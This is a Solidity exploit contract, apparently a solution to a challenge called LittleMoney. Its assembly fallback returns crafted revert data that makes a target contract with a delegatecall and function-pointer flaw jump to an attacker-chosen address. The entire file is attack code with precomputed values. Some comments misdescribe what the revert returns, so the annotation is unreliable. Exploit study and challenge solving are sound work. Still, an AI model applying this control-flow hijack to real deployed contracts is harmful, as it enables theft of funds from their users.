// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title LittleMoney Exploit - Minimal Assembly Implementation
/// @notice Pure assembly contract that exploits the delegatecall+function pointer vulnerability
/// @dev Bytecode size must be <= 12 bytes, contains carefully crafted return data
contract LittleMoneyExploit {
    /// @notice Fallback function that returns block number and calculated offset
    /// @dev Returns data that will be used to calculate jump address
    /// @dev gasprice() balance contains precomputed 0xffffff35 (= -0xcb in two's complement)
    fallback() external payable {
        assembly {
            // Get gas price and load its balance (contains 0xffffff35)
            // This was precomputed: 0x1f5 - 0x22a = -0xcb = 0xffffff35
            let v := balance(gasprice())
            
            // Store v at offset 0x00
            mstore(0x00, v)
            
            // Get current block number and store at offset 0x20
            mstore(0x20, number())
            
            // Revert with 32 bytes of data (0x00:0x20 contains v and block number)
            revert(0x00, 0x20)
        }
    }
}
